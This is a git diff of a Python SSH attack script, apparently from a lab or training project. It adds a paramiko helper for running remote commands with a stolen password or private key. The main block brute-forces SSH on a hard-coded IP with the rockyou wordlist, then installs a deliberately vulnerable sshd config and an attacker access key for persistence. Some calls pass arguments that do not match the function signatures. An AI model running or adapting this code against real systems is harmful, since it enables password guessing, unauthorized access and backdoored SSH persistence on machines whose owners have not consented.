@@ -137,14 +137,78 @@ def setup_ssh_config_and_key(hostname, port, credentials_path="resources\\creden
     ssh.close()
     return False
 
+# Do not need to merge this with revampedAttackScript, already done
+def ssh_run_command_privKey(command, host, username, password=None, private_key_path=None):
+    """
+    Runs a SINGLE command through ssh remotely and grab the output.
+
+    Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
+
+    Either a password OR a private key MUST be provided. If both are provided, the private key will be used.
+
+    Args:
+        command (str): The command to run on the remote server.
+        host (str): The hostname or IP address of the remote server.
+        username (str): The username to use for the SSH connection.
+        password (str): The password to use for the SSH connection.
+        private_key_path (str): The path to the private key file.
+
+    Returns:
+        None
+    """
+
+    ssh_output: str = "" # Declare as string to prevent error proning
+
+    # Create an SSH client
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        # Connect to the remote server
+        if private_key_path is not None:
+            # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
+            private_key = paramiko.Ed25519Key.from_private_key_file(private_key_path)
+            ssh.connect(host, username=username, pkey=private_key)
+        elif password is not None:
+            ssh.connect(host, username=username, password=password)
+        else:
+            # Handle case when neither password nor private key is provided
+            print("Please provide either a password or a private key.")
+            return
+
+        # Placeholder for other code to run after successful connection
+        print("Connected to the remote server.")
+        # Run the command
+        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
+        ssh_output_list = ssh_stdout.readlines()
+        for line_no, line in enumerate(ssh_output_list):
+            ssh_output_list[line_no] = line.replace("\r\n", "\n")
+        ssh_output = "".join(ssh_output_list)
+
+        return ssh_output
+
+    except paramiko.AuthenticationException:
+        print("Authentication failed. Please check your credentials.")
+    except paramiko.SSHException as e:
+        print(f"An SSH error occurred: {e}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+    ssh.close()
+
 if __name__ == "__main__":
     hostname = "100.87.185.10"
     port = 22
     username = "itpuser"
     password_file = "resources\\rockyou.txt"
 
+    ssh_brute_force(hostname, port, username, password_file)
+
     sshd_config_path = "resources\\vuln_sshd_config"
     access_key_path = "resources\\accessKey.pub"
 
-    ssh_brute_force(hostname, port, username, password_file)
     setup_ssh_config_and_key(hostname, sshd_config_path, access_key_path)
+
+    private_key_path = "resources\\accessKey"
+
+    #ssh_run_command_privKey(hostname, username, private_key_path)
